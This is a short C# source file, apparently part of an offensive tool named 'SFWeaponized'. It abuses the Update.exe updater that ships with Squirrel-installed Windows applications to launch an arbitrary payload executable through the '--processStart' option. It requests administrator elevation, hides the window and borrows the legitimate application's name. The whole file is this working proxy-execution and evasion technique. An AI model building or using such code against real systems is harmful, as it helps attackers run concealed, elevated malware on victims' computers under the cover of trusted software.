using System.Diagnostics;
using System.IO;

namespace SFWeaponized.Model
{
    public class SquirrelApp
    {
        public string Name { get; set; }
        public string Root { get; set; }
        public string IconPath { get; set; }
        public string CurrentVersion { get; set; }

        public SquirrelApp(string name, string root, string iconPath, string currentVersion) 
        { 
            Name = name;
            Root = root;
            IconPath = iconPath;
            CurrentVersion = currentVersion;
        }

        public void Invoke(string payloadExeName)
        {
            string updateFilePath = Path.Combine(Root, "Update.exe");

            if (!File.Exists(updateFilePath))
                return;

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = updateFilePath,
                Arguments = $"--processStart {payloadExeName} --process-start-args {Name}.exe",
                UseShellExecute = true,
                Verb = "runas",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process.Start(startInfo);
        }
    }
}
